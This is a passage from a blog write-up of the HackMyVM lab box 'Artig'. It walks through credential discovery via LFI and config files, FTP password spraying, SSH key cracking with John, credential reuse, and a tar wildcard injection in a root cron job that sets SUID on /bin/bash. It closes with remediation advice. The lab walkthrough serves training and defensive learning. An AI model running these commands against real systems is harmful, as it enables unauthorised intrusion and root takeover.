+<p>From the output I discovered a second user I hadn&rsquo;t seen before: <strong>mario</strong>.</p>
+<p>Since Redis was exposed on the scan and the FTP note hinted at misconfigured service files, I read the Redis configuration file with the same LFI.</p>
+<pre tabindex="0"><code>/etc/redis/redis.conf
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_c0ce4c67a714cc31.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_dd96f953d33ef110.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_4b902c0498145ac2.webp 946w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_4b902c0498145ac2.webp 946w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="946"
+        height="247"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_9f61f46e1f3c13d0.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_3db3b43b92da0189.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/redis-config_hu_9f61f46e1f3c13d0.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config.png 946w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config.png 946w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I went through the config file line by line (piping it through <code>less</code> so I could move slowly) and, buried under the <strong>ACTIVE DEFRAGMENTATION</strong> section, I found a note addressed to <code>mario</code> containing what looks like a user password.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_fd1a8589538e82f2.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_b0e506285b7e44f1.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_63215362cda78220.webp 946w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_63215362cda78220.webp 946w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="946"
+        height="416"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_ffc68d3cc9ed0995.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_1f25841eb0d9785d.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note_hu_ffc68d3cc9ed0995.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note.png 946w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/redis-config-note.png 946w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-ftp-access-as-mario" class="relative group">Step 3: FTP Access as Mario <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-ftp-access-as-mario" aria-label="Anchor">#</a></span></h2><p>I first tested the recovered password against both <code>mike</code> and <code>mario</code> over SSH, but neither accepted it.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_83a8614f52cbd085.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_7e0208899e8de654.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_a66ee8cf192410de.webp 836w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_a66ee8cf192410de.webp 836w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="836"
+        height="168"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_e407c45fe41e933d.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_876fb41169d1df01.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail_hu_e407c45fe41e933d.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail.png 836w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-fail.png 836w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Since FTP was still running with anonymous access earlier, I did a quick password spray on the FTP service with the recovered password — and it worked. I successfully authenticated as <code>mario</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_bf7cd011f5514edc.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_45adc73d8f97cabe.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_db5ebf320776877d.webp 845w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_db5ebf320776877d.webp 845w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="845"
+        height="93"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_9e5a44ad09d6705e.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_74ac917eb68143fc.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray_hu_9e5a44ad09d6705e.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray.png 845w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-password-spray.png 845w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>ftp mario@192.168.56.114
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-as-mario_hu_a320e5e802add6ae.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="305"
+        height="154"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-as-mario.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The session dropped me into mario&rsquo;s home directory. No sign of a user flag yet, but there were some interesting files to pull down.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/mario-home-dir_hu_a6a90dcb46b95d26.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="600"
+        height="228"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/mario-home-dir.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I downloaded <code>.bash_history</code> to see what commands mario had run through the box.</p>
+<pre tabindex="0"><code>get .bash_history
+</code></pre><pre tabindex="0"><code>└─$ cat .bash_history
+cd
+ls
+ls -al
+mkdir .ssh
+cd .ssh/
+ls
+ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
+ls -al
+cat id_rsa
+cd ..
+id
+sudo -l
+cd ..
+cd var
+cd www
+cd html
+ls -al
+cd ..
+cd
+exit
+</code></pre><p>Inside the <code>.ssh</code> directory I found the SSH keypair mario generated.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-ssh-keys_hu_42f3f0d71bc64595.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="597"
+        height="89"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-ssh-keys.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>ftp&gt; mget *
+mget id_rsa [anpqy?]? y
+229 Entering Extended Passive Mode (|||27181|)
+150 Opening BINARY mode data connection for id_rsa (1856 bytes).
+100% |***********************************************************************|  1856      172.43 KiB/s    00:00 ETA
+226 Transfer complete.
+1856 bytes received in 00:00 (162.35 KiB/s)
+mget id_rsa.pub [anpqy?]? y
+229 Entering Extended Passive Mode (|||49577|)
+150 Opening BINARY mode data connection for id_rsa.pub (393 bytes).
+100% |***********************************************************************|   393        2.86 MiB/s    00:00 ETA
+226 Transfer complete.
+393 bytes received in 00:00 (269.70 KiB/s)
+ftp&gt;
+</code></pre><p>The private key turned out to be passphrase-protected, so I extracted the hash with <code>ssh2john</code>.</p>
+<pre tabindex="0"><code>ssh2john id_rsa
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh2john-hash_hu_52925e6e7d485bc.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="520"
+        height="118"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ssh2john-hash.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I saved the hash and cracked it with <strong>John the Ripper</strong> against <code>rockyou.txt</code>.</p>
+<pre tabindex="0"><code>ssh2john id_rsa &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/john-crack_hu_8c5dbb4ab49609df.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="597"
+        height="157"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/john-crack.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The passphrase cracked quickly, but when I tried to authenticate over SSH with the key it still kept prompting for a password instead of using the key.</p>
+<pre tabindex="0"><code>ssh -i id_rsa mario@192.168.56.114
+mario@192.168.56.114&#39;s password:
+Permission denied, please try again.
+mario@192.168.56.114&#39;s password:
+</code></pre><p>I decided to go back to FTP and dig further. As <code>mario</code> I could move outside the home directory, and I navigated into <code>/var/www/html/</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-var-www_hu_e2a79bc20efb0fc9.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="380"
+        height="64"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-var-www.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Two files stood out as worth grabbing — they often hold credentials: <code>wp-config.php</code> and its backup.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/wp-config-files_hu_34988faa1061e66d.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="644"
+        height="93"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/wp-config-files.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I downloaded both and read them.</p>
+<h2 id="step-4-initial-access--ssh-as-max" class="relative group">Step 4: Initial Access — SSH as max <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-initial-access--ssh-as-max" aria-label="Anchor">#</a></span></h2><p><code>wp-config.php</code> contained the WordPress database credentials.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_b106aadf97dadbdb.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_e9dc2d28a3a632b5.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_aa70734d12b5e63b.webp 716w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_aa70734d12b5e63b.webp 716w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="716"
+        height="234"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_7bb93d3fafbdfe7.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_be6693ca54e7725b.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds_hu_7bb93d3fafbdfe7.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds.png 716w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wp-config-creds.png 716w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The same credentials pattern showed up in <code>wp-config.bak</code>. I took the two passwords from these files and tested them against the users I knew about — and one of them granted me an SSH session as <strong>max</strong>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_f6b5722c23baeb61.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_cdc74249c8eab8ce.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_8e82372a22f4965f.webp 705w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_8e82372a22f4965f.webp 705w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="705"
+        height="191"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_5272d3b8f937378e.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_8b3e8c951dc73a32.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max_hu_5272d3b8f937378e.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max.png 705w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-as-max.png 705w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-5-privilege-escalation" class="relative group">Step 5: Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-privilege-escalation" aria-label="Anchor">#</a></span></h2><h3 id="escalating-to-www-data" class="relative group">Escalating to www-data <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#escalating-to-www-data" aria-label="Anchor">#</a></span></h3><p>Once I was in as <code>max</code>, I enumerated the account and checked my sudo rights.</p>
+<pre tabindex="0"><code>max@Artig:~$ id
+uid=1000(max) gid=1000(max) groups=1000(max),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
+max@Artig:~$ sudo -l
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_6d036bf5f5b9b7d5.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_8c1ca76d4db0e73.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_66653577006341b5.webp 673w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_66653577006341b5.webp 673w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="673"
+        height="148"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_f3a514f328e657c8.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_966e531b5109ba43.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l_hu_f3a514f328e657c8.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l.png 673w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/sudo-l.png 673w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p><code>max</code> can run <code>/bin/bash</code> as the <code>www-data</code> user without a password. I executed the command and dropped into a shell as <code>www-data</code>.</p>
+<pre tabindex="0"><code>sudo -u www-data /bin/bash
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/www-data-shell_hu_c416451478d84b1.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="383"
+        height="77"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/www-data-shell.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I tried injecting a command into the sudo invocation to jump straight to a higher user, but the sudo privilege is dropped immediately once the child command runs, so that path was a dead end.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/injection-fail_hu_2cfce9ea9e8295d7.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="489"
+        height="49"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/injection-fail.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="the-wildcard-injection" class="relative group">The Wildcard Injection <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-wildcard-injection" aria-label="Anchor">#</a></span></h3><p>I checked the system crontab for anything running as root.</p>
+<pre tabindex="0"><code>cat /etc/crontab
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_eeecb8a0695c61f.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_59659dc180f504f1.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_c1e506bad11fbfaf.webp 807w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_c1e506bad11fbfaf.webp 807w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="807"
+        height="306"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_89bf2068b2e5a48a.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_6214c6952c0a927f.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/crontab_hu_89bf2068b2e5a48a.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/crontab.png 807w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/crontab.png 807w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>There it is — <code>/opt/backup.sh</code> runs with root privileges. I read the script.</p>
+<pre tabindex="0"><code>max@Artig:~$ cat /opt/backup.sh
+#!/bin/bash
+
+BACKUP_DIR=&#34;/root&#34;
+TARGET=&#34;/var/www/html&#34;
+
+mkdir -p $BACKUP_DIR
+
+cd $TARGET
+tar -czf $BACKUP_DIR/wordpress_backup.tar.gz *
+</code></pre><p>The script uses <code>tar</code> with the <code>*</code> wildcard inside <code>/var/www/html/</code>. Since I already had write access to that directory as <code>www-data</code>, this was a textbook <code>tar</code> wildcard injection: <code>tar</code> expands the <code>*</code> glob, and any specially named files are treated as command-line options, including <code>--checkpoint-action=exec</code>, which runs arbitrary commands.</p>
+<p>I created the payload files:</p>
+<pre tabindex="0"><code>echo &#39;chmod u+s /bin/bash&#39; &gt; shell.sh
+chmod +x shell.sh
+echo &#34;&#34; &gt; &#34;--checkpoint=1&#34;
+echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=sh shell.sh&#34;
+</code></pre><p>Once the cron job next ran <code>tar</code> (about a minute), the checkpoint options fired <code>shell.sh</code> as root, which set the SUID bit on <code>/bin/bash</code>. I verified it after the script executed.</p>
+<pre tabindex="0"><code>ls -la /bin/bash
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/suid-bash-check_hu_6f0774c4aa1593fc.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="499"
+        height="61"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/suid-bash-check.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>With the SUID bit set, I spawned a root shell.</p>
+<pre tabindex="0"><code>bash -p
+</code></pre><p>That completed the box — full root access from a weakly protected cron job.</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>The break-in on Artig relied on a chain of exposed services, leaked credentials, and a classic cron misconfiguration:</p>
+<ol>
+<li>Anonymous FTP leaked a note pointing at service configuration files.</li>
+<li>WordPress&rsquo;s <code>site-editor</code> plugin gave a local file inclusion (CVE-2018-7422) to read <code>/etc/passwd</code> and <code>/etc/redis/redis.conf</code>.</li>
+<li>A password hidden in the Redis config unlocked FTP access as <code>mario</code>.</li>
+<li>FTP as <code>mario</code> exposed SSH keys and WordPress config backups with database credentials.</li>
+<li>Credential reuse granted SSH access as <code>max</code>.</li>
+<li>A <code>sudo</code> rule allowed pivoting to <code>www-data</code>.</li>
+<li>A root cron job running <code>tar</code> with a wildcard was abused to set the SUID bit on <code>/bin/bash</code> and gain root.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Remove or patch vulnerable plugins:</strong> delete <code>site-editor</code> or update it to a version without the LFI.</li>
+<li><strong>Restrict FTP access:</strong> disable anonymous login and avoid serving filesystem-wide access to authenticated users.</li>
+<li><strong>Harden Redis:</strong> bind to localhost, require authentication, and never store passwords in configuration comments.</li>
+<li><strong>Protect web roots:</strong> keep database passwords unique and out of backups like <code>wp-config.bak</code>.</li>
+<li><strong>Sanitize cron scripts:</strong> quote wildcards (<code>tar -czf backup.tar.gz *</code> → explicit paths or <code>--</code>) so filenames cannot be interpreted as options.</li>
+<li><strong>Enforce password diversity</strong> to prevent credential reuse across services.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="https://k40tik.github.io/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
